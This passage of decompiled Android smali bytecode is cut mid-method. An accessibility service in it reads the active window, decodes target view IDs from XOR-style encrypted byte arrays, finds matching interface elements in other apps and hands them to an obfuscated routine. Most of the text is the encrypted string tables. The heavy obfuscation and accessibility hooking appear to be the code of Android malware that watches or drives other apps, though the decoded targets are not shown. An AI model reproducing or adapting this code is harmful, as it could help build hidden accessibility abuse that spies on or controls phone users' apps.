    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v2, 0x2a

    new-array v2, v2, [B

    fill-array-data v2, :array_20

    new-array v3, v3, [B

    fill-array-data v3, :array_21

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lt v2, v5, :cond_c

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_c

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;

    invoke-direct {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;-><init>(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;)V

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->e(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :cond_c
    return-void

    :catch_2
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_3
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_4
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_5
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_6
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_7
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_8
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    :catch_9
    move-exception v0

    move-object v2, v0

    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, v2}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0

    nop

    :array_0
    .array-data 1
        -0x68t
        -0x7et
        0xbt
        0x7ct
        -0x4t
        -0x1dt
        0x6t
        0x17t
        -0x66t
        -0x7dt
        0x41t
        0x63t
        -0x4t
        -0x1ct
        0x3t
        0x3t
        -0x6et
        -0x77t
        0xat
        0x74t
        -0x19t
        -0x22t
        0xat
        0x4at
        -0x53t
        -0x78t
        0x57t
        0x78t
        -0xbt
        -0x1ct
        0x4t
        0x58t
        -0x71t
        -0x7ct
        0x4at
        0x7ft
        -0x30t
        -0x1et
        0x3t
        0x5ct
    .end array-data

    :array_1
    .array-data 1
        -0x5t
        -0x13t
        0x25t
        0x11t
        -0x6dt
        -0x73t
        0x67t
        0x39t
    .end array-data

    :array_2
    .array-data 1
        -0x3dt
        0x23t
        0x11t
        0x7t
        -0x7bt
        -0x24t
        -0xct
        0x5dt
        -0x3ft
        0x22t
        0x5bt
        0x18t
        -0x7bt
        -0x25t
        -0xft
        0x49t
        -0x37t
        0x28t
        0x10t
        0xft
        -0x62t
        -0x1ct
        -0x10t
        0x1t
        -0x37t
        0x2at
        0x56t
        0x9t
        -0x75t
        -0x3at
        -0x4t
        0x1ct
        -0x32t
        0xft
        0x50t
        0xet
        -0x71t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x60t
        0x4ct
        0x3ft
        0x6at
        -0x16t
        -0x4et
        -0x6bt
        0x73t
    .end array-data

    :array_4
    .array-data 1
        0x7ct
        -0x2dt
        -0x76t
        -0x37t
        0x2ct
        -0x3dt
        0x7dt
        -0x7t
        0x7et
        -0x2et
        -0x40t
        -0x2at
        0x2ct
        -0x3ct
        0x78t
        -0x13t
        0x76t
        -0x28t
        -0x75t
        -0x3bt
        0x27t
        -0x37t
        0x4bt
        -0x4at
        0x73t
        -0x30t
        -0x3ft
        -0x30t
        0x2t
        -0x37t
        0x78t
        -0x5bt
        0x7at
        -0x31t
        -0x29t
        -0x1at
        0x37t
        -0x3dt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x1ft
        -0x44t
        -0x5ct
        -0x5ct
        0x43t
        -0x53t
        0x1ct
        -0x29t
    .end array-data

    :array_6
    .array-data 1
        -0x1ct
        -0x7bt
        -0x65t
        -0x3t
        0x70t
        -0x73t
        -0x5dt
        0x41t
        -0x1at
        -0x7ct
        -0x2ft
        -0x1et
        0x70t
        -0x76t
        -0x5at
        0x55t
        -0x12t
        -0x72t
        -0x66t
        -0xat
        0x73t
        -0x53t
        -0x5dt
        0x19t
        -0x31t
        -0x7bt
        -0x3at
        -0x1ct
    .end array-data

    :array_7
    .array-data 1
        -0x79t
        -0x16t
        -0x4bt
        -0x70t
        0x1ft
        -0x1dt
        -0x3et
        0x6ft
    .end array-data

    :array_8
    .array-data 1
        -0x20t
        0x5t
        0x2at
        -0x1ft
        0x6bt
        -0x21t
        0x2et
        -0x14t
        -0x1et
        0x4t
        0x60t
        -0x2t
        0x6bt
        -0x28t
        0x2bt
        -0x8t
        -0x16t
        0xet
        0x2bt
        -0x8t
        0x6dt
        -0x3bt
        0x23t
        -0x59t
        -0x3ft
        0xbt
        0x76t
        -0x21t
        0x61t
        -0x30t
        0x3dt
        -0x5ft
        -0x15t
        0x28t
        0x71t
        -0x8t
        0x70t
        -0x22t
        0x21t
    .end array-data

    :array_9
    .array-data 1
        -0x7dt
        0x6at
        0x4t
        -0x74t
        0x4t
        -0x4ft
        0x4ft
        -0x3et
    .end array-data

    :array_a
    .array-data 1
        0x5bt
        -0x56t
        0x76t
        0x43t
        -0x6ft
        -0x52t
        -0x7at
        -0x3bt
        0x59t
        -0x55t
        0x3ct
        0x5ct
        -0x6ft
        -0x57t
        -0x7dt
        -0x2ft
        0x51t
        -0x5ft
        0x77t
        0x43t
        -0x76t
        -0x61t
        -0x7et
        -0x71t
        0x51t
        -0x4ft
        0xct
        0x4bt
        -0x7at
        -0x4ct
    .end array-data

    nop

    :array_b
    .array-data 1
        0x38t
        -0x3bt
        0x58t
        0x2et
        -0x2t
        -0x40t
        -0x19t
        -0x15t
    .end array-data

    :array_c
    .array-data 1
        -0x4bt
        0x3ct
        0x4et
        0x18t
        -0x75t
        -0x76t
        -0xft
        0x58t
        -0x5at
        0x38t
        0x4ft
        0x1ct
        -0x7ft
        -0x76t
        -0x6t
        0x46t
        -0x59t
        0x3at
        0x4et
        0xet
        -0x70t
        -0x7ft
        -0xat
        0x4dt
        -0x55t
        0x3ct
        0x52t
        0x10t
        -0x6at
        -0x69t
        -0x15t
        0x48t
        -0x5ft
        0x3at
        0x54t
        0x12t
        -0x7ft
    .end array-data

    nop

    :array_d
    .array-data 1
        -0xct
        0x7ft
        0x1at
        0x51t
        -0x3ct
        -0x3ct
        -0x52t
        0x19t
    .end array-data

    :array_e
    .array-data 1
        0x2at
        0x1ft
        0x6bt
        0x5et
    .end array-data

    :array_f
    .array-data 1
        0x5ft
        0x6ct
        0xft
        0x2at
        -0x3et
        -0x3at
        -0x66t
        0x9t
    .end array-data

    :array_10
    .array-data 1
        -0x6dt
        -0xft
        0x4t
        -0x5bt
        -0x5at
        0x37t
        0x1ft
        0x77t
        -0x6ft
        -0x10t
        0x4et
        -0x46t
        -0x5at
        0x30t
        0x1at
        0x63t
        -0x67t
        -0x6t
        0x5t
        -0x55t
        -0x44t
        0x2bt
        0xct
        0x3ct
        -0x62t
        -0x3t
        0x53t
        -0x7ct
        -0x60t
        0x2at
        0xat
    .end array-data

    :array_11
    .array-data 1
        -0x10t
        -0x62t
        0x2at
        -0x38t
        -0x37t
        0x59t
        0x7et
        0x59t
    .end array-data

    :array_12
    .array-data 1
        0x77t
        -0x4ct
        0x9t
        0x78t
        -0x7at
        -0x71t
        0x4bt
        -0x1ct
        0x75t
        -0x4bt
        0x43t
        0x67t
        -0x7at
        -0x78t
        0x4et
        -0x10t
        0x7dt
        -0x41t
        0x8t
        0x70t
        -0x63t
        -0x5et
        0x45t
        -0x5ct
        0x60t
        -0x42t
        0x49t
        0x61t
    .end array-data

    :array_13
    .array-data 1
        0x14t
        -0x25t
        0x27t
        0x15t
        -0x17t
        -0x1ft
        0x2at
        -0x36t
    .end array-data

    :array_14
    .array-data 1
        0x69t
        0x50t
        0x3at
        0x4dt
        0x4ft
        -0x2at
        -0x69t
        0x49t
        0x7at
        0x54t
        0x3bt
        0x49t
        0x45t
        -0x2at
        -0x64t
        0x57t
        0x7bt
        0x56t
        0x3at
        0x5bt
        0x54t
        -0x23t
        -0x70t
        0x5ct
        0x77t
        0x50t
        0x26t
        0x45t
        0x52t
        -0x35t
        -0x73t
        0x59t
        0x7dt
        0x56t
        0x20t
        0x47t
        0x45t
    .end array-data

    nop

    :array_15
    .array-data 1
        0x28t
        0x13t
        0x6et
        0x4t
        0x0t
        -0x68t
        -0x38t
        0x8t
    .end array-data

    :array_16
    .array-data 1
        -0x20t
        -0xct
        0x15t
        -0x54t
        -0x76t
        -0x56t
        -0x5at
        0x26t
        -0xdt
        -0x10t
        0x14t
        -0x58t
        -0x80t
        -0x56t
        -0x53t
        0x38t
        -0xet
        -0xet
        0x15t
        -0x46t
        -0x6ft
        -0x5ft
        -0x5ft
        0x33t
        -0x2t
        -0xct
        0x9t
        -0x5ct
        -0x69t
        -0x49t
        -0x44t
        0x36t
        -0xct
        -0xet
        0xft
        -0x5at
        -0x80t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x5ft
        -0x49t
        0x41t
        -0x1bt
        -0x3bt
        -0x1ct
        -0x7t
        0x67t
    .end array-data

    :array_18
    .array-data 1
        -0x80t
        0x33t
        -0x6t
        -0xet
    .end array-data

    :array_19
    .array-data 1
        -0x3bt
        0x65t
        -0x4at
        -0x4ct
        -0x55t
        0x50t
        0x1bt
        0x35t
    .end array-data

    :array_1a
    .array-data 1
        -0x1t
        -0x48t
        0x51t
        0x49t
        -0x44t
        -0x26t
        -0x53t
        -0x52t
        -0x3t
        -0x47t
        0x1bt
        0x56t
        -0x44t
        -0x23t
        -0x58t
        -0x46t
        -0xbt
        -0x4dt
        0x50t
        0x46t
        -0x59t
        -0x26t
        -0x71t
        -0x11t
        -0xet
        -0x5dt
        0x16t
        0x4at
        -0x5at
        -0x2ft
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x64t
        -0x29t
        0x7ft
        0x24t
        -0x2dt
        -0x4ct
        -0x34t
        -0x80t
    .end array-data

    :array_1c
    .array-data 1
        -0x6et
        -0x6t
        -0x42t
        0x7at
        -0x26t
        -0x76t
        0x59t
        -0x1t
        -0x70t
        -0x5t
        -0xct
        0x65t
        -0x26t
        -0x73t
        0x5ct
        -0x15t
        -0x68t
        -0xft
        -0x41t
        0x7ct
        -0x30t
        -0x63t
        0x5at
        -0x42t
        -0x70t
        -0x19t
        -0xct
    .end array-data

    :array_1d
    .array-data 1
        -0xft
        -0x6bt
        -0x70t
        0x17t
        -0x4bt
        -0x1ct
        0x38t
        -0x2ft
    .end array-data

    :array_1e
    .array-data 1
        -0x6et
        -0x3ft
        0x6at
    .end array-data

    :array_1f
    .array-data 1
        -0x30t
        -0x4bt
        0x4t
        -0x26t
        0x13t
        -0x15t
        -0x56t
        0x78t
    .end array-data

    :array_20
    .array-data 1
        0x7ct
        -0x4t
        -0x7t
        -0x4t
        -0x39t
        0x44t
        -0x56t
        -0x66t
        0x7et
        -0x3t
        -0x4dt
        -0x1dt
        -0x39t
        0x43t
        -0x51t
        -0x72t
        0x76t
        -0x9t
        -0x8t
        -0x1at
        -0x3ft
        0x5et
        -0x5dt
        -0x30t
        0x6dt
        -0xet
        -0x60t
        -0x10t
        -0x3ct
        0x75t
        -0x56t
        -0x30t
        0x7bt
        -0x1ft
        -0x4et
        -0x1et
        -0x25t
        0x75t
        -0x48t
        -0x2ft
        0x71t
        -0x9t
    .end array-data

    nop

    :array_21
    .array-data 1
        0x1ft
        -0x6dt
        -0x29t
        -0x6ft
        -0x58t
        0x2at
        -0x35t
        -0x4ct
    .end array-data
.end method
